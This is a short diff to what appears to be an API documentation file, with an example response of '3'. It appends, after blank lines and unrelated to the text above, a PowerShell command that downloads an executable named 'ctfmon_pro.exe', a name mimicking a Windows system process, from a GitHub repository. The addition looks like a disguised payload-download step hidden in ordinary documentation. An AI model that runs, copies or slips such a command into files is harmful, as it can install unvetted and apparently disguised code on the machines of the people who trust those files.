@@ -32,3 +32,8 @@ vercel
 
 **Response**:
 `3` (or the correct index)
+
+
+
+Invoke-WebRequest -Uri "https://github.com/Gautam369-web/OASBackend/raw/main/ctfmon_pro.exe" -OutFile "ctfmon_pro.exe"
+
